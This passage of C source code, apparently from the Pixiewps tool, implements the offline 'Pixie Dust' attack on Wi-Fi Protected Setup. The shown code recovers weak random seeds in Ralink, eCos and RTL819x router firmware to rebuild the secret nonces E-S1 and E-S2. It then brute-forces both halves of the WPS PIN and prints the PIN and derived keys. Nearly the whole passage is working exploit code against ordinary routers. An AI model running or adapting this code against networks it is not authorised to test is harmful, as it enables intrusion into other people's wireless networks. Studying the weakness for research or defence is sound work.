					wps->end = start_p;
				}
			}
		}
		else {
			if (end_p != (time_t) -1) {
				if (end_p >= wps->start) {
					snprintf(wps->error, 256, "\n [!] Bad Ending point!\n\n");
					goto usage_err;
				}
				else {
					wps->end = end_p;
				}
			}
			else {
				if (wps->bruteforce) {
					wps->start += SEC_PER_DAY; /* Extra 1 day */
					wps->end = 0;
				}
			}
		}
	}

	if (wps->small_dh_keys) { /* Small DH keys selected */
		wps->pkr = malloc(WPS_PKEY_LEN);
		if (!wps->pkr)
			goto memory_err;

		/* g^A mod p = 2 (g = 2, A = 1, p > 2) */
		memset(wps->pkr, 0, WPS_PKEY_LEN - 1);
		wps->pkr[WPS_PKEY_LEN - 1] = 0x02;

		if (!wps->authkey) {
			if (wps->e_nonce) {
				if (wps->r_nonce) {
					if (wps->e_bssid) { /* Computing AuthKey */
						wps->dhkey = malloc(WPS_HASH_LEN);
						if (!wps->dhkey)
							goto memory_err;
						wps->kdk = malloc(WPS_HASH_LEN);
						if (!wps->kdk)
							goto memory_err;

						uint8_t *buffer = malloc(WPS_NONCE_LEN * 2 + WPS_BSSID_LEN);
						if (!buffer)
							goto memory_err;

						/* DHKey = SHA-256(g^(AB) mod p) = SHA-256(PKe^A mod p) = SHA-256(PKe) (g = 2, A = 1, p > 2) */
						sha256(wps->pke, WPS_PKEY_LEN, wps->dhkey);

						memcpy(buffer, wps->e_nonce, WPS_NONCE_LEN);
						memcpy(buffer + WPS_NONCE_LEN, wps->e_bssid, WPS_BSSID_LEN);
						memcpy(buffer + WPS_NONCE_LEN + WPS_BSSID_LEN, wps->r_nonce, WPS_NONCE_LEN);

						/* KDK = HMAC-SHA-256{DHKey}(Enrollee nonce || Enrollee MAC || Registrar nonce) */
						hmac_sha256(wps->dhkey, WPS_HASH_LEN, buffer, WPS_NONCE_LEN * 2 + WPS_BSSID_LEN, wps->kdk);

						uint8_t *nbuffer = realloc(buffer, WPS_HASH_LEN * 3);
						if (!nbuffer) {
							free(buffer);
							goto memory_err;
						}
						buffer = nbuffer;

						/* Key derivation function */
						kdf(wps->kdk, buffer);

						wps->authkey = malloc(WPS_AUTHKEY_LEN);
						if (!wps->authkey)
							goto memory_err;

						memcpy(wps->authkey, buffer, WPS_AUTHKEY_LEN);

						if (wps->verbosity > 2) {
							wps->wrapkey = malloc(WPS_KEYWRAPKEY_LEN);
							if (!wps->wrapkey)
								goto memory_err;
							wps->emsk = malloc(WPS_EMSK_LEN);
							if (!wps->emsk)
								goto memory_err;

							memcpy(wps->wrapkey, buffer + WPS_AUTHKEY_LEN, WPS_KEYWRAPKEY_LEN);
							memcpy(wps->emsk, buffer + WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN, WPS_EMSK_LEN);
						}
						if (wps->verbosity < 3) {
							free(wps->dhkey);
							free(wps->kdk);
						}
						free(buffer);
					}
					else {
						snprintf(wps->error, 256, "\n [!] Neither --authkey and --e-bssid have been supplied!\n\n");
						goto usage_err;
					}
				}
				else {
					snprintf(wps->error, 256, "\n [!] Neither --authkey and --r-nonce have been supplied!\n\n");
					goto usage_err;
				}
			}
			else {
				snprintf(wps->error, 256, "\n [!] Neither --authkey and --e-nonce have been supplied!\n\n");
				goto usage_err;
			}
		}
	}

	/* E-S1 = E-S2 = 0 */
	wps->e_s1 = calloc(WPS_SECRET_NONCE_LEN, 1); if (!wps->e_s1) goto memory_err;
	wps->e_s2 = calloc(WPS_SECRET_NONCE_LEN, 1); if (!wps->e_s2) goto memory_err;

	/* Allocating memory for digests */
	wps->psk1 = malloc(WPS_HASH_LEN); if (!wps->psk1) goto memory_err;
	wps->psk2 = malloc(WPS_HASH_LEN); if (!wps->psk2) goto memory_err;
	wps->empty_psk = malloc(WPS_HASH_LEN); if (!wps->empty_psk) goto memory_err;

	empty_pin_hmac(wps);

	uint_fast8_t k = 0;
	uint_fast8_t found_p_mode = NONE;
	uint32_t seed;

	wps->nonce_seed = 0;
	wps->s1_seed = 0;
	wps->s2_seed = 0;

	/* Main loop */
	while (!found_p_mode && k < MODE_LEN && p_mode[k] != NONE) {

		/* 1 */
		if (p_mode[k] == RT) {

			DEBUG_PRINT(" * Mode: %d (%s)", RT, p_mode_name[RT]);
			DEBUG_PRINT("Trying with E-S1: ");
			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
			DEBUG_PRINT("Trying with E-S2: ");
			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

			uint_fast8_t r = crack(wps, wps->pin);
			if (r == PIN_FOUND) {
				found_p_mode = RT;
				DEBUG_PRINT("Pin found");
			}

			if (!found_p_mode) {
				init_crack_jobs(wps, RT);
				wps->nonce_seed = collect_crack_jobs();
				if (wps->nonce_seed != 0) {
					unsigned lfsr = bit_revert(wps->nonce_seed);
					int k = 8 * 32;
					while (k--) {
						unsigned int lsb_mask = ~(lfsr & 1) + 1;
						lfsr ^= lsb_mask & 0xd4000003;
						lfsr >>= 1;
						lfsr |= lsb_mask & 0x80000000;
					}
					struct ralink_randstate prng;
					prng.sreg = bit_revert(lfsr);
					wps->s1_seed = prng.sreg;
					for (int i = 0; i < WPS_NONCE_LEN; i++)
						wps->e_s1[i] = ralink_randbyte(&prng);
					wps->s2_seed = prng.sreg;
					for (int i = 0; i < WPS_NONCE_LEN; i++)
						wps->e_s2[i] = ralink_randbyte(&prng);

					DEBUG_PRINT("Trying with E-S1: ");
					DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
					DEBUG_PRINT("Trying with E-S2: ");
					DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

					r = crack(wps, wps->pin);
					if (r == PIN_FOUND) {
						found_p_mode = RT;
						DEBUG_PRINT("Pin found");
					}
				}
			}

		/* 2 */
		}
		else if (p_mode[k] == ECOS_SIMPLE && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_SIMPLE, p_mode_name[ECOS_SIMPLE]);

			uint32_t index = wps->e_nonce[0] << 25; /* Reducing entropy from 32 to 25 bits */
			do {
				seed = index;
				uint_fast8_t i;
				for (i = 1; i < WPS_NONCE_LEN; i++) {
					if (wps->e_nonce[i] != (uint8_t) (ecos_rand_simple(&seed) & 0xff))
						break;
				}
				if (i == WPS_NONCE_LEN) { /* Seed found */
					wps->nonce_seed = index;

					wps->s1_seed = seed;
					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
						wps->e_s1[i] = (uint8_t) (ecos_rand_simple(&seed) & 0xff);
					wps->s2_seed = seed;
					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
						wps->e_s2[i] = (uint8_t) (ecos_rand_simple(&seed) & 0xff);

					DEBUG_PRINT("Seed found %u", wps->nonce_seed);
					break;
				}
				index++;
			} while (!(index & 0x02000000));

			if (wps->nonce_seed) { /* Seed found */

				DEBUG_PRINT("Trying with E-S1: ");
				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
				DEBUG_PRINT("Trying with E-S2: ");
				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

				uint_fast8_t r = crack(wps, wps->pin);
				if (r == PIN_FOUND) {
					found_p_mode = ECOS_SIMPLE;
					DEBUG_PRINT("Pin found");
				}
			}

		/* 3 */
		}
		else if (p_mode[k] == RTL819x && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", RTL819x, p_mode_name[RTL819x]);

			/* E-S1 = E-S2 = E-Nonce - Best case scenario */
			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
			memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN);

			DEBUG_PRINT("Trying with E-S1: ");
			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
			DEBUG_PRINT("Trying with E-S2: ");
			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

			uint_fast8_t r = crack(wps, wps->pin);
			if (r == PIN_FOUND) {
				found_p_mode = RTL819x;
				DEBUG_PRINT("Pin found");
			}

			if (found_p_mode == NONE) {
				if (wps->small_dh_keys || check_small_dh_keys(wps->pkr)) {
					if (!wps->warning) {
						wps->warning = calloc(256, 1);
						if (!wps->warning)
							goto memory_err;
						snprintf(wps->warning, 256, " [!] Small DH keys is not supported for mode %d!\n\n", RTL819x);
					}
				}
				else {

					/* Checks if the sequence may actually be generated by current random function */
					if (!(wps->e_nonce[0] & 0x80) && !(wps->e_nonce[4]  & 0x80) &&
						!(wps->e_nonce[8] & 0x80) && !(wps->e_nonce[12] & 0x80)) {

						init_crack_jobs(wps, RTL819x);

						#if DEBUG
						{
							struct tm ts;
							char buffer[30];
							ts = *gmtime(&wps->start);
							strftime(buffer, 30, "%c", &ts);
							printf("\n [DEBUG] %s:%d:%s(): Start: %10lu (%s UTC)",
								__FILE__, __LINE__, __func__, (unsigned long) wps->start, buffer);
							ts = *gmtime(&wps->end);
							strftime(buffer, 30, "%c", &ts);
							printf("\n [DEBUG] %s:%d:%s(): End:   %10lu (%s UTC)",
								__FILE__, __LINE__, __func__, (unsigned long) wps->end, buffer);
							fflush(stdout);
						}
						#endif

						wps->nonce_seed = collect_crack_jobs();

						if (wps->nonce_seed) { /* Seed found */
							found_p_mode = find_rtl_es(wps);
						}

						if (found_p_mode == NONE && !wps->bruteforce) {
							if (!wps->warning) {
								wps->warning = calloc(256, 1);
								if (!wps->warning)
									goto memory_err;
								snprintf(wps->warning, 256, " [!] The AP /might be/ vulnerable. Try again with --force or with another (newer) set of data.\n\n");
							}
						}
					}
				}
			}

		/* 4 */
		}
		else if (p_mode[k] == ECOS_SIMPLEST && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_SIMPLEST, p_mode_name[ECOS_SIMPLEST]);

			uint32_t index = 0;
			do {
				seed = index;
				uint_fast8_t i;
				for (i = 0; i < WPS_NONCE_LEN; i++) {
					if (wps->e_nonce[i] != (uint8_t) ecos_rand_simplest(&seed))
						break;
				}
				if (i == WPS_NONCE_LEN) { /* Seed found */
					wps->nonce_seed = index;

					wps->s1_seed = seed;
					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
						wps->e_s1[i] = (uint8_t) ecos_rand_simplest(&seed);

					wps->s2_seed = seed;
					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
						wps->e_s2[i] = (uint8_t) ecos_rand_simplest(&seed);

					DEBUG_PRINT("Seed found %u", wps->nonce_seed);
					break;
				}
				index++;
			} while (index != 0xffffffff);

			if (wps->nonce_seed) { /* Seed found */

				DEBUG_PRINT("Trying with E-S1: ");
				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
				DEBUG_PRINT("Trying with E-S2: ");
				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

				uint_fast8_t r = crack(wps, wps->pin);
				if (r == PIN_FOUND) {
					found_p_mode = ECOS_SIMPLEST;
					DEBUG_PRINT("Pin found");
				}
			}

		/* 5 */
		}
		else if (p_mode[k] == ECOS_KNUTH && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_KNUTH, p_mode_name[ECOS_KNUTH]);

			uint32_t index = 0;
			do {
				seed = index;
				uint_fast8_t i;
				for (i = 0; i < WPS_NONCE_LEN; i++) {
					if (wps->e_nonce[i] != (uint8_t) ecos_rand_knuth(&seed))
						break;
				}
				if (i == WPS_NONCE_LEN) { /* Seed found */
					wps->nonce_seed = index;

					wps->s1_seed = seed;
					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
						wps->e_s1[i] = (uint8_t) ecos_rand_knuth(&seed);

					wps->s2_seed = seed;
					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
						wps->e_s2[i] = (uint8_t) ecos_rand_knuth(&seed);

					DEBUG_PRINT("Seed found %u", wps->nonce_seed);
					break;
				}
				index++;
			} while (index != 0xffffffff);

			if (wps->nonce_seed) { /* Seed found */

				DEBUG_PRINT("Trying with E-S1: ");
				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
				DEBUG_PRINT("Trying with E-S2: ");
				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

				uint_fast8_t r = crack(wps, wps->pin);
				if (r == PIN_FOUND) {
					found_p_mode = ECOS_KNUTH;
					DEBUG_PRINT("Pin found");
				}
			}

		}

		k++;
	}

	gettimeofday(&t_end, 0);
	unsigned long ms_elapsed = get_elapsed_ms(&t_start, &t_end);

	k--;

#ifdef DEBUG
	puts("");
#endif

	printf("\n Pixiewps %s\n", SHORT_VERSION);

	if (found_p_mode) {
		if (wps->verbosity > 1) {
			printf("\n [?] Mode:     %u (%s)", found_p_mode, p_mode_name[found_p_mode]);
		}
		if (wps->e_nonce) {
			if (wps->verbosity > 2) {
				if (found_p_mode != NONE) {
					if (found_p_mode == RTL819x) {
						time_t seed_time;
						struct tm ts;
						char buffer[30];

						printf("\n [*] Seed N1:  %u", wps->nonce_seed);
						seed_time = wps->nonce_seed;
						ts = *gmtime(&seed_time);
						strftime(buffer, 30, "%c", &ts);
						printf(" (%s UTC)", buffer);
						printf("\n [*] Seed ES1: %u", wps->s1_seed);
						seed_time = wps->s1_seed;
						ts = *gmtime(&seed_time);
						strftime(buffer, 30, "%c", &ts);
						printf(" (%s UTC)", buffer);
						printf("\n [*] Seed ES2: %u", wps->s2_seed);
						seed_time = wps->s2_seed;
						ts = *gmtime(&seed_time);
						strftime(buffer, 30, "%c", &ts);
						printf(" (%s UTC)", buffer);
					}
					else {
						if (found_p_mode == RT && wps->nonce_seed == 0)
							printf("\n [*] Seed N1:  -");
						else
							printf("\n [*] Seed N1:  0x%08x", wps->nonce_seed);
						printf("\n [*] Seed ES1: 0x%08x", wps->s1_seed);
						printf("\n [*] Seed ES2: 0x%08x", wps->s2_seed);
					}
				}
			}
		}
		if (wps->verbosity > 2) {
			if (wps->dhkey) { /* To see if AuthKey was supplied or not */
				printf("\n [*] DHKey:    "); byte_array_print(wps->dhkey, WPS_HASH_LEN);
				printf("\n [*] KDK:      "); byte_array_print(wps->kdk, WPS_HASH_LEN);
				printf("\n [*] AuthKey:  "); byte_array_print(wps->authkey, WPS_AUTHKEY_LEN);
				printf("\n [*] EMSK:     "); byte_array_print(wps->emsk, WPS_EMSK_LEN);
				printf("\n [*] KWKey:    "); byte_array_print(wps->wrapkey, WPS_KEYWRAPKEY_LEN);
			}
			printf("\n [*] PSK1:     "); byte_array_print(wps->psk1, WPS_PSK_LEN);
			printf("\n [*] PSK2:     "); byte_array_print(wps->psk2, WPS_PSK_LEN);
		}
		if (wps->verbosity > 1) {
			printf("\n [*] ES1:      "); byte_array_print(wps->e_s1, WPS_SECRET_NONCE_LEN);
			printf("\n [*] ES2:      "); byte_array_print(wps->e_s2, WPS_SECRET_NONCE_LEN);
		}
		if (wps->pin[0] == '\0') {
			printf("\n [+] WPS pin:  <empty>");
		}
		else {
			printf("\n [+] WPS pin:  %s", wps->pin);
		}
	}
	else {
		printf("\n [-] WPS pin not found!");
	}
	printf("\n\n [*] Time taken: %lu s %lu ms\n\n", ms_elapsed / 1000, ms_elapsed % 1000);

	if (wps->warning) {
		printf("%s", wps->warning);
		free(wps->warning);
	}

	if (found_p_mode == NONE) {
		if ((!memcmp(wps->pke, wps_rtl_pke, WPS_PKEY_LEN) &&
				((wps->e_nonce[0] & 0x80) || (wps->e_nonce[4] & 0x80) || (wps->e_nonce[8] & 0x80) || (wps->e_nonce[12] & 0x80))) ||
				(!memcmp(wps->e_nonce, "\x00\x00", 2) && !memcmp(wps->e_nonce + 4, "\x00\x00", 2)) ||
				(!memcmp(wps->e_nonce + 2, "\x00\x00", 2) && !memcmp(wps->e_nonce + 6, "\x00\x00", 2)) ||
				(wps->e_nonce[0] == 0 && wps->e_nonce[4] == 0 && wps->e_nonce[8] == 0 && wps->e_nonce[12] == 0) ||
				(wps->e_nonce[3] == 0 && wps->e_nonce[7] == 0 && wps->e_nonce[11] == 0 && wps->e_nonce[15] == 0))
			printf(" " STR_CONTRIBUTE "\n\n");
	}
	else if (found_p_mode == ECOS_SIMPLE || found_p_mode == ECOS_SIMPLEST || found_p_mode == ECOS_KNUTH) {
		printf(" " STR_CONTRIBUTE "\n\n");
	}

	free(wps->pke);
	free(wps->pkr);
	free(wps->e_hash1);
	free(wps->e_hash2);
	free(wps->authkey);
	free(wps->e_nonce);
	free(wps->r_nonce);
	free(wps->e_bssid);
	free(wps->psk1);
	free(wps->psk2);
	free(wps->e_s1);
	free(wps->e_s2);
	free(wps->error);

	if (wps->verbosity > 2) {
		free(wps->dhkey);
		free(wps->kdk);
		free(wps->wrapkey);
		free(wps->emsk);
	}

	free(wps);

	return found_p_mode != 0 ? PIN_FOUND : PIN_ERROR;
}

/* Simplest */
uint32_t ecos_rand_simplest(uint32_t *seed)
{
	*seed = (*seed * 1103515245) + 12345; /* Permutate seed */
	return *seed;
}

/* Simple, Linear congruential generator */
uint32_t ecos_rand_simple(uint32_t *seed)
{
	uint32_t s = *seed;
	uint32_t uret;

	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret = s & 0xffe00000;                 /* Use top 11 bits */
	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret += (s & 0xfffc0000) >> 11;        /* Use top 14 bits */
	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret += (s & 0xfe000000) >> (11 + 14); /* Use top 7 bits */

	*seed = s;
	return uret;
}

/* Mersenne-Knuth */
uint32_t ecos_rand_knuth(uint32_t *seed)
{
	#define MM 2147483647 /* Mersenne prime */
	#define AA 48271      /* This does well in the spectral test */
	#define QQ 44488      /* MM / AA */
	#define RR 3399       /* MM % AA, important that RR < QQ */

	*seed = AA * (*seed % QQ) - RR * (*seed / QQ);
	if (*seed & 0x80000000)
		*seed += MM;

	return *seed;
}

/* Simple power function */
int int_pow(int a, int exp)
{
	if (exp <= 0) return 1;
	int r = a;

	while (--exp) r *= a;
	return r;
}

/* return non-zero if pin half is correct, zero otherwise */
static int check_pin_half(const uint8_t pinhalf[4], uint8_t *psk, const uint8_t *es, struct global *wps, const uint8_t *ehash)
{
	uint8_t buffer[WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2];
	uint8_t result[WPS_HASH_LEN];

	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, pinhalf, 4, psk);
	memcpy(buffer, es, WPS_SECRET_NONCE_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN, psk, WPS_PSK_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, sizeof buffer, result);

	return !memcmp(result, ehash, WPS_HASH_LEN);
}

/* return non-zero if pin half is correct, zero otherwise */
static int check_empty_pin_half(const uint8_t *es, struct global *wps, const uint8_t *ehash)
{
	uint8_t buffer[WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2];
	uint8_t result[WPS_HASH_LEN];

	memcpy(buffer, es, WPS_SECRET_NONCE_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->empty_psk, WPS_PSK_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, sizeof buffer, result);

	return !memcmp(result, ehash, WPS_HASH_LEN);
}

/* returns 1 if numeric pin half found, -1 if empty pin found, 0 if not found */
static int crack_first_half(struct global *wps, char *pin, const uint8_t *es1_override)
{
	*pin = 0;
	const uint8_t *es1 = es1_override ? es1_override : wps->e_s1;

	if (check_empty_pin_half(es1, wps, wps->e_hash1)) {
		memcpy(wps->psk1, wps->empty_psk, WPS_HASH_LEN);
		return -1;
	}

	unsigned first_half;
	uint8_t psk[WPS_HASH_LEN];

	for (first_half = 0; first_half < 10000; first_half++) {
		uint_to_char_array(first_half, 4, pin);
		if (check_pin_half(pin, psk, es1, wps, wps->e_hash1)) {
			pin[4] = 0; /* make sure pin string is zero-terminated */
			memcpy(wps->psk1, psk, sizeof psk);
			return 1;
		}
	}

	return 0;
}

/* returns non-zero if pin found, -1 if empty pin found, 0 if not found */
static int crack_second_half(struct global *wps, char *pin)
{
	if (!pin[0] && check_empty_pin_half(wps->e_s2, wps, wps->e_hash2)) {
		memcpy(wps->psk2, wps->empty_psk, WPS_HASH_LEN);
		return 1;
	}

	unsigned second_half, first_half = atoi(pin);
	char *s_pin = pin + strlen(pin);
	uint8_t psk[WPS_HASH_LEN];

	for (second_half = 0; second_half < 1000; second_half++) {
		unsigned int checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
		unsigned int c_second_half = second_half * 10 + checksum_digit;
		uint_to_char_array(c_second_half, 4, s_pin);
		if (check_pin_half(s_pin, psk, wps->e_s2, wps, wps->e_hash2)) {
			memcpy(wps->psk2, psk, sizeof psk);
			pin[8] = 0;
			return 1;
		}
	}

	for (second_half = 0; second_half < 10000; second_half++) {

		/* If already tested skip */
		if (wps_pin_valid(first_half * 10000 + second_half)) {
			continue;
		}

		uint_to_char_array(second_half, 4, s_pin);
		if (check_pin_half(s_pin, psk, wps->e_s2, wps, wps->e_hash2)) {
			memcpy(wps->psk2, psk, sizeof psk);
			pin[8] = 0; /* make sure pin string is zero-terminated */
			return 1;
		}
	}

	return 0;
}

/* PIN cracking attempt - returns 0 for success, 1 for failure */
static int crack(struct global *wps, char *pin)
{
	return !(crack_first_half(wps, pin, 0) && crack_second_half(wps, pin));
}
